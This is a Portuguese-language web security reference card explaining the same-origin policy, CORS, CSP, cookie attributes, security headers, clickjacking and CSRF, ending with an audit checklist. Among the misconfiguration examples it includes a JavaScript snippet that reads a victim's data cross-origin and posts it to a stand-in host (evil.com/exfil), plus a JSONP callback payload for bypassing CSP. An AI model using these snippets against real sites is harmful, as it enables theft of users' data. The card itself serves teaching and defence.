---
title: Web Fundamentos de Segurança — SOP, CORS, CSP, Cookies, Headers
category: auth
stack: [HTTP, browser security, CSP, CORS, cookies]
tags: [web, sop, cors, csp, cookies, headers, fundamentos]
excerpt: O terreno onde XSS, CSRF, SSRF, clickjacking e cookie hijacking são jogados — entender pra atacar e pra defender.
related: [sec-injection-attacks-deep, sec-auth-attacks-modern, session-strategy, auth-architecture]
updated: "2026-05-10"
---

## Por que isso importa

Quase toda vulnerabilidade web é um conflito de assumpções sobre SOP, CORS, CSP ou cookies. Você não consegue exploitar XSS reflexa em app moderna sem entender CSP. Não consegue defender CSRF sem entender SameSite. Não consegue fazer SSRF útil sem entender cookies de mesma origem. Esse card é o mapa do terreno.

## Same-Origin Policy (SOP) — a base

Origem = `(scheme, host, port)`. Mesmo origem = JS pode ler/escrever DOM. Origens diferentes = bloqueado por default.

| URL atual | URL target | Mesma origem? |
|-----------|-----------|---------------|
| `https://app.com/page` | `https://app.com/api` | ✅ Sim |
| `https://app.com` | `https://api.app.com` | ❌ Não (host diferente) |
| `https://app.com` | `http://app.com` | ❌ Não (scheme diferente) |
| `https://app.com:443` | `https://app.com:8443` | ❌ Não (port diferente) |

SOP **não bloqueia requests** — bloqueia leitura da resposta. Por isso CSRF funciona: o request sai com cookies, o servidor processa, mas o JS atacante não consegue ler. Por isso CORS existe: relaxar leitura intencional.

## CORS — onde 90% das config dão errado

CORS = mecanismo do servidor declarar "essa origem pode ler minha resposta". Implementado via headers de resposta.

### Anatomia do request CORS

```
# Simple request (GET, HEAD, POST com Content-Type limitado)
GET /api/me HTTP/1.1
Host: api.app.com
Origin: https://evil.com

# Preflight (qualquer outro: PUT, DELETE, custom headers, Content-Type: application/json)
OPTIONS /api/me HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

Servidor responde com:
```
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 600
```

### Misconfigurações exploráveis

```javascript
// ❌ Pior: reflexa de qualquer origem + credenciais
Access-Control-Allow-Origin: <reflete Origin do request>
Access-Control-Allow-Credentials: true
// Atacante hospeda em evil.com:
fetch('https://api.target.com/me', { credentials: 'include' })
  .then(r => r.json()).then(data => fetch('https://evil.com/exfil', { method: 'POST', body: JSON.stringify(data) }))

// ❌ "null" origin aceito (file://, sandbox iframes, redirects)
Access-Control-Allow-Origin: null
// Atacante usa <iframe sandbox="allow-scripts" src="data:...">

// ❌ Subdomain wildcard regex mal feito
// Backend valida com: origin.endsWith('.app.com')
// Atacante registra: notapp.com → 'evilapp.com' passa

// ❌ Mesmo origem em allowlist mas wildcard
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  ← spec proíbe combo, mas alguns servidores enviam mesmo assim
```

**Correto**: allowlist estrita de origens, sem reflexão. `null` nunca. Wildcard só pra API pública sem credenciais.

## CSP — Content Security Policy

CSP é uma policy que o browser enforça baseado em header `Content-Security-Policy`. Restringe de onde JS, CSS, imagens, fontes etc. podem ser carregados.

### CSP que funciona vs CSP que tem bypass

```http
# ❌ Inútil
Content-Security-Policy: default-src *

# ❌ Permite XSS via inline script
Content-Security-Policy: default-src 'self' 'unsafe-inline'

# ❌ JSONP endpoint em domain whitelisted = XSS via callback
Content-Security-Policy: script-src 'self' https://accounts.google.com
# <script src="https://accounts.google.com/o/oauth2/auth?callback=alert(1)"></script>

# ✅ Strict CSP com nonce (recomendado pra app nova)
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-inline' https:; object-src 'none'; base-uri 'none'
# 'strict-dynamic' propaga confiança via nonce
# 'unsafe-inline' + 'https:' são fallback pra browsers velhos (ignorados pelos novos)
```

### Bypass de CSP comuns em pentest

1. **`unsafe-inline` + reflexão de input em script tag** → XSS clássica volta.
2. **JSONP em whitelist** (`accounts.google.com`, `ajax.googleapis.com`) → callback executa JS arbitrário.
3. **AngularJS em whitelist** + reflexão de input em DOM → AngularJS sandbox escape.
4. **`script-src 'self'` + upload de arquivo .js servido como JS** → você upa script, depois inclui.
5. **Base tag injection** → muda base URL, novos scripts relativos vão pra atacante. Mitigado por `base-uri 'none'`.

Testar com **CSP Evaluator** (csp-evaluator.withgoogle.com).

## Cookies — atributos críticos

```
Set-Cookie: session=abc123; Domain=.app.com; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

| Atributo | Efeito | Quando usar |
|----------|--------|-------------|
| `Secure` | Só envia em HTTPS | **Sempre** em produção. |
| `HttpOnly` | JS não consegue ler (XSS não exfiltra) | **Sempre** pra session cookie. |
| `SameSite=Strict` | Não envia em request cross-site, mesmo top-level navigation | Sessão. Quebra fluxo de "login via link" se Strict. |
| `SameSite=Lax` | Envia em top-level GET, não em sub-resources | Default moderno do Chrome/FF. |
| `SameSite=None; Secure` | Envia em qualquer contexto cross-site | Necessário pra widget embedded (Stripe Checkout em iframe). |
| `__Host-` prefix | Force Secure, Path=/, sem Domain | Recomendado pra session. Não pode ser sobrescrito por subdomain. |
| `__Secure-` prefix | Force Secure (mas permite Domain) | Variante mais flexível. |

### Cookie attacks

- **Session fixation**: atacante seta cookie session via XSS/subdomain → vítima loga → atacante usa o mesmo session. Mitigado regenerando session ID no login.
- **Cookie tossing**: subdomain (`evil.app.com`) seta cookie com Domain=.app.com → vai pra main app. Mitigado com `__Host-` prefix.
- **CSRF**: cookies vão automaticamente em request cross-site. SameSite=Lax mitiga GET-based. Strict mitiga tudo. CSRF token mitiga em legacy.

## Security Headers — checklist

```http
# Strict-Transport-Security: força HTTPS por N segundos
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# X-Content-Type-Options: bloqueia MIME sniffing (xss via .txt servido como html)
X-Content-Type-Options: nosniff

# X-Frame-Options: bloqueia iframe (anti-clickjacking) — legacy mas ainda útil
X-Frame-Options: DENY

# Referrer-Policy: controla envio do Referer (evita leak de URL com token)
Referrer-Policy: strict-origin-when-cross-origin

# Permissions-Policy (substitui Feature-Policy): controla APIs do browser
Permissions-Policy: camera=(), microphone=(), geolocation=(self)

# Cross-Origin-Opener-Policy / Cross-Origin-Embedder-Policy / Cross-Origin-Resource-Policy
# Isolamento de origem (necessário pra SharedArrayBuffer, mitiga Spectre)
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-site
```

Testar com **securityheaders.com** ou **Mozilla Observatory**.

## Clickjacking

Vítima visita `evil.com`, que tem `<iframe src="bank.com/transfer">` invisível sobreposto a um botão fake "WIN PRIZE". Clique vai pro iframe, transfere dinheiro.

Mitigação moderna (2026):
- `X-Frame-Options: DENY` (ou `SAMEORIGIN`) — legacy mas ainda funciona em todo browser.
- `Content-Security-Policy: frame-ancestors 'none'` — substituto moderno, mais granular.
- Para apps que **precisam** ser embedded (widgets): `frame-ancestors https://parent-site.com`.

## CSRF — quando ainda importa em 2026

Com `SameSite=Lax` default no Chrome, CSRF clássico via form POST não funciona mais (cookie não vai). Mas:

- **GET-based CSRF** (state-changing GETs — anti-pattern, mas existe) ainda funciona com Lax.
- **Top-level navigation** com `<form>` ainda envia cookie Lax.
- **Same-site subdomain attack**: `evil.app.com` (subdomain comprometido) → `api.app.com`, cookies vão.

Defesas modernas, em ordem:
1. `SameSite=Strict` no session cookie + cookie de estado leve para fluxos cross-site.
2. CSRF token (double-submit ou stateful) para endpoints sensíveis.
3. Custom header (`X-Requested-With`) verificado server-side — força preflight CORS.

## Checklist de auditoria de uma app

- [ ] HTTPS forçado, HSTS preload-ready?
- [ ] Session cookie: `__Host-`, `Secure`, `HttpOnly`, `SameSite` apropriado?
- [ ] CSP existe? Strict (nonce + strict-dynamic) ou legacy (`unsafe-inline`)?
- [ ] CORS allowlist estrita? `null` rejeitado? Reflexão de Origin? Wildcards?
- [ ] Headers de segurança presentes (HSTS, nosniff, frame-ancestors, COOP/COEP)?
- [ ] CSRF token em endpoints state-changing? Validação de Origin/Referer como segunda camada?
- [ ] Subdomain takeover? CNAME órfãos para Heroku/S3/Azure?

## Leituras

- "Web Application Hacker's Handbook" 2ª ed. (clássico, ainda relevante)
- MDN: SOP, CORS, CSP, SameSite cookies
- PortSwigger Web Security Academy — CSRF, CORS, Clickjacking tracks
- "The Tangled Web" — Michal Zalewski (browser security deep)
- Cure53 reports (cure53.de/publications) — exemplos reais de bypass
